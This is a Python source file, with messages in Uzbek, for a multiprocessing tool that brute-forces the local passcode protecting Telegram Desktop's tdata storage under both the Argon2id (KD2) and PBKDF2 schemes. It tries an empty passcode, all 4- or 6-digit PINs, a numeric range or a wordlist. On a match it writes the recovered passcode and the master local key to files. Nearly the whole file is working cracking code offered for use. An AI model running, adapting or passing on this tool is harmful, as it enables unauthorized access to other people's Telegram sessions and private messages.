"""
Telegram KD2 & PBKDF2 Passcode Cracker (Multiprocessing Engine)
High-performance brute-force engine for Telegram Desktop's KD2 (Argon2id + AES-IGE)
and Legacy/Standard (PBKDF2-HMAC-SHA512 + AES-IGE) local storage protection.
"""

import os
import sys
import time
import argparse
from pathlib import Path
from typing import List, Tuple, Optional, Union
from concurrent.futures import ProcessPoolExecutor, as_completed

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# Add parent directory to sys.path so it works both standalone and imported
CURRENT_DIR = Path(__file__).resolve().parent
PARENT_DIR = CURRENT_DIR.parent
if str(PARENT_DIR) not in sys.path:
    sys.path.insert(0, str(PARENT_DIR))

from core.tdata_parser import TDataParser, KD2Info
from core.crypto import verify_kd2_candidate
from core.hardware import get_system_specs, get_optimal_worker_count, set_process_low_priority


# Top-level worker function for multiprocessing pickling
def _worker_check_batch(args: Tuple[List[str], bytes, bytes, bytes, int, int, int]) -> Optional[Tuple[str, bytes]]:
    # Set low process priority so the OS UI and other tasks remain completely smooth
    set_process_low_priority()

    batch, salt, key128, ciphertext, time_c, mem_c, kdf_id = args
    for candidate in batch:
        ok, local_key = verify_kd2_candidate(
            candidate,
            salt,
            key128,
            ciphertext,
            time_cost=time_c,
            memory_cost=mem_c,
            kdf_id=kdf_id,
        )
        if ok and local_key is not None:
            return candidate, local_key
    return None


class KD2Cracker:
    """
    Multithreaded / Multiprocessing Brute-force cracker for Telegram KD2 & PBKDF2.
    Dynamically scales workers according to CPU threads and available physical RAM.
    """

    def __init__(self, kd2_info: KD2Info, max_workers: Optional[int] = None):
        self.kd2 = kd2_info
        mem_per_worker = max(32, (kd2_info.memory_cost // 1024) + 32)
        self.max_workers, self.hardware_reason = get_optimal_worker_count(
            memory_per_worker_mb=mem_per_worker,
            user_override=max_workers,
        )

    @classmethod
    def from_source(cls, source: Union[str, Path], max_workers: Optional[int] = None) -> "KD2Cracker":
        source_path = Path(source)
        if not source_path.exists():
            raise FileNotFoundError(f"Manba topilmadi: {source_path}")
        kd2_info, _ = TDataParser.load_from_source(source_path)
        return cls(kd2_info, max_workers=max_workers)

    def crack(
        self,
        candidates: List[str],
        batch_size: Optional[int] = None,
        output_dir: Optional[Union[str, Path]] = None,
        save_artifacts: bool = True,
    ) -> Optional[Tuple[str, bytes]]:
        out_dir = Path(output_dir) if output_dir else Path.cwd()
        if save_artifacts:
            out_dir.mkdir(parents=True, exist_ok=True)
        total = len(candidates)
        if total == 0:
            print("⚠️ Tekshirish uchun kombinatsiyalar ro'yxati bo'sh!")
            return None

        # Quick check: test empty passcode ("") first in case account has no local passcode
        ok_empty, lk_empty = verify_kd2_candidate(
            "",
            self.kd2.salt,
            self.kd2.key128,
            self.kd2.ciphertext,
            time_cost=self.kd2.time_cost,
            memory_cost=self.kd2.memory_cost,
            kdf_id=self.kd2.kdf_id,
        )
        if ok_empty and lk_empty is not None:
            print("\n" + "=" * 65)
            print("🎉 AKKAUNTDA LOKAL PAROL O'RNATILMAGAN (Bo'sh parol '')!")
            print(f"Master LocalKey: {lk_empty[:16].hex()}... ({len(lk_empty)} bayt)")
            print("=" * 65 + "\n")
            if save_artifacts:
                (out_dir / "found_passcode.txt").write_text("\n", encoding="utf-8")
                (out_dir / "found_local_key.bin").write_bytes(lk_empty)
            return "", lk_empty

        # Auto-compute dynamic batch size based on candidates and workers
        if batch_size is None or batch_size <= 0:
            batch_size = max(1, min(50, total // (self.max_workers * 4)))

        specs = get_system_specs()
        kdf_name = "KD2 Argon2id" if self.kd2.kdf_id != 0 else "PBKDF2-HMAC-SHA512"
        print("=" * 65)
        print(f"Telegram {kdf_name} Multi-Core Cracker")
        print(f"Tizim               : {specs['os']} {specs['release']} ({specs['arch']})")
        print(f"Jami kombinatsiyalar: {total:,}")
        print(f"Hardware tahlili    : {self.hardware_reason}")
        print(f"Paket hajmi (batch) : {batch_size} ta har bir topshiriqqa")
        if self.kd2.kdf_id != 0:
            print(f"Argon2 xotira sarfi : {self.kd2.memory_cost // 1024} MB per attempt")
            print(f"Argon2 qadamlari    : {self.kd2.time_cost} iteratsiya")
        else:
            print(f"PBKDF2 qadamlari    : {self.kd2.time_cost:,} iteratsiya")
        print("=" * 65)

        t0 = time.time()
        batches = [candidates[i : i + batch_size] for i in range(0, total, batch_size)]
        task_args = [
            (
                b,
                self.kd2.salt,
                self.kd2.key128,
                self.kd2.ciphertext,
                self.kd2.time_cost,
                self.kd2.memory_cost,
                self.kd2.kdf_id,
            )
            for b in batches
        ]

        done_count = 0
        found_result = None

        with ProcessPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_batch = {executor.submit(_worker_check_batch, arg): arg[0] for arg in task_args}

            last_report_time = time.time()

            for future in as_completed(future_to_batch):
                batch_candidates = future_to_batch[future]
                done_count += len(batch_candidates)

                result = future.result()
                if result is not None:
                    found_result = result
                    pwd, local_key = result
                    dt = time.time() - t0
                    print("\n" + "=" * 65)
                    print(f"🎉🎉🎉 PAROL TOPILDI: '{pwd}' 🎉🎉🎉")
                    print(f"Master LocalKey: {local_key[:16].hex()}... ({len(local_key)} bayt)")
                    print(f"Sarflangan vaqt: {dt:.1f} soniya ({done_count}/{total})")
                    print("=" * 65 + "\n")

                    if save_artifacts:
                        (out_dir / "found_passcode.txt").write_text(f"{pwd}\n", encoding="utf-8")
                        (out_dir / "found_local_key.bin").write_bytes(local_key)
                        print(f"✅ Natijalar saqlandi: {out_dir / 'found_passcode.txt'}")

                    # Cancel remaining tasks
                    for f in future_to_batch:
                        f.cancel()
                    break

                now = time.time()
                if now - last_report_time >= 3.0:
                    dt = now - t0
                    speed = done_count / dt if dt > 0 else 0
                    percent = (done_count / total) * 100
                    rem_sec = (total - done_count) / speed if speed > 0 else 0
                    print(f"Progress: {done_count:,}/{total:,} ({percent:.1f}%) | Tezlik: {speed:.1f} urinish/s | Qoldi: ~{rem_sec/60:.1f} daqiqa")
                    last_report_time = now

        if found_result is None:
            dt = time.time() - t0
            print(f"\n❌ Berilgan barcha {total:,} ta kombinatsiya tekshirildi, lekin mos parol topilmadi.")
            print(f"Jami sarflangan vaqt: {dt:.1f} soniya.")

        return found_result


def main():
    parser = argparse.ArgumentParser(description="Telegram KD2 & PBKDF2 Passcode Cracker")
    parser.add_argument("--source", "-s", required=True, help="Telegram backup ZIP fayli yoki tdata papkasi")
    parser.add_argument("--mode", "-m", choices=["pin4", "pin6", "range", "wordlist"], default="pin4", help="Qidiruv rejimi (standart: pin4)")
    parser.add_argument("--start", type=int, default=0, help="Range rejimi uchun boshlang'ich son")
    parser.add_argument("--end", type=int, default=9999, help="Range rejimi uchun tugash soni")
    parser.add_argument("--digits", "-d", type=int, default=None, help="Range rejimi uchun raqamlar uzunligi (masalan: 4 yoki 6)")
    parser.add_argument("--wordlist", "-w", type=str, help="So'zlar ro'yxati fayli (.txt)")
    parser.add_argument("--threads", "-t", type=int, default=None, help="CPU yadrolari soni (standart: avtomatik)")
    parser.add_argument("--output", "-o", type=str, default=".", help="Natijalarni saqlash papkasi")

    args = parser.parse_args()

    candidates: List[str] = []
    if args.mode == "pin4":
        candidates = [f"{i:04d}" for i in range(10000)]
    elif args.mode == "pin6":
        candidates = [f"{i:06d}" for i in range(1000000)]
    elif args.mode == "range":
        width = args.digits if args.digits else max(4, len(str(args.end)))
        candidates = [f"{i:0{width}d}" for i in range(args.start, args.end + 1)]
    elif args.mode == "wordlist":
        if not args.wordlist or not Path(args.wordlist).exists():
            print(f"❌ Wordlist fayli topilmadi: {args.wordlist}")
            sys.exit(1)
        candidates = Path(args.wordlist).read_text(encoding="utf-8", errors="ignore").splitlines()

    cracker = KD2Cracker.from_source(args.source, max_workers=args.threads)
    cracker.crack(candidates, output_dir=args.output)


if __name__ == "__main__":
    main()
